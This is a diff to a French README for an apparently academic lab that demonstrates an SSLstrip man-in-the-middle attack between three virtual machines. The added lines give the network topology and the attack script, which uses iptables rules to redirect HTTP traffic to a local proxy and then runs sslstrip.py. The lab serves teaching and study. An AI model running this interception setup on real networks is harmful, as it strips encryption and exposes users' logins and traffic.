@@ -14,6 +14,30 @@ L'environnement de test consiste en trois machines virtuelles :
 
 - immortal, la machine attaquante, positionnée en homme du milieu.
 
+Voici la topologie des machines mise en place :
+
+```
+### twolans
+#
+#  opeth - [s1] - immortal - [s2] - grave
+#
+#
+#
+
+# switches
+
+SWITCH s1
+SWITCH s2
+HOST alpinex   grave    s2
+HOST debian10  immortal s1 s2
+HOST debian10  opeth    s1
+```
+
+
+Cette topologie n'est pas forcément réalise car rare sont les cas où l'attaquant est dans le réseau du client attaqué. 
+
+Toutes les configurations initiales des machines se trouvent dans le fichier __"start.sh"__ de chaque dossier correspondant aux machines.
+
 ## Machine "grave" (147.210.13.2)
 
 Cette machine utilise l'environnement graphique de la distribution Linux Alpine. Le navigateur firefox est utilisé pour la démonstration.
@@ -35,6 +59,7 @@ Le serveur héberge deux pages :
 ## Machine "immortal" (147.210.12.2 - 147.210.13.1)
 
 C'est sur cette machine que se trouve le PoC de l'attaque, dans le fichier "/mnt/host/attack.sh". Cette VM est configuré pour forwarder les paquets entre opeth et grave.
+
 
 ------------------------------------------------------
 
@@ -63,6 +88,19 @@ Nous arrivons alors sur la page secure.php, en HTTPS : immortal n'a pas pût voi
 ![screen3](https://repo.t0x0sh.org/images/mastercsi-ter/sslstrip/screen3.png)
 
 ## Etape 2 : lancement de l'attaque
+
+Comme préciser précédement, pour lancer l'attaque, il faut lancer le fichier __"/mnt/host/attack.sh"__ depuis immortal. 
+Voici son contenu :
+
+```
+PROXY_PORT=4242
+
+iptables -t nat -F
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PROXY_PORT
+
+/mnt/host/sslstrip.py $PROXY_PORT
+```
+Il nous est nécessaire de rediriger tout le flux TCP sur le port d'écoute afin de traiter les requêtes.
 
 Nous pouvons maintenant lancer l'attaque depuis la machine immortal :
 
